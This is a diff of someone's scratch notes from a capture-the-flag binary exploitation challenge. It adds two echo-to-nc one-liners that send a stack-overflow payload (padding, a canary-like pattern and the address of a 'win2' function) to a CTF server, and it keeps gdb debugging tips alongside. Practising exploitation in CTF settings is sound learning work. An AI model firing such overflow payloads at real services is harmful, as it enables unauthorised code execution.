@@ -7,10 +7,14 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\024\011@\0\0
 //0000000000400b88 - win2
 //AAAAAAAAAAAAAAAAAAAAAAAAÿÿÿÿÿÿÿÿìÈìÈìÈìÈ\011@\0\0
 0000000000400bc5 - win2
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBÈ\011@\0\0
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBÅ\011@\0\0
 
 //0000000000400b2a - main
 //AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB*\011@\0\0
+
+echo -e 'AAAAAAAAAAAAAAAAAAAAAAAA\xff\xff\xff\xff\xff\xff\xff\xff\xec\xc8\xec\xc8\xec\xc8\xec\xc8\x88\x0b@\x00\x00' | nc nc.ctf.unitedctf.ca 4000
+
+echo -e 'AAAAAAAAAAAAAAAAAAAAAAAA\xff\xff\xff\xff\xff\xff\xff\xff\xec\xc8\xec\xc8\xec\xc8\xec\xc8\x88\x0b@\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xec\xc8\xec\xc8\xec\xc8\xec\xc8' | nc nc.ctf.unitedctf.ca 4000
 
 0x1337133713371337
 0xECC8ECC8ECC8ECC8	// flipped
@@ -30,3 +34,6 @@ breakpoints:
 
 show stack:		x/100x $sp
 show registers:	info registers
+
+
+ctrl+space inserts a NULL \0
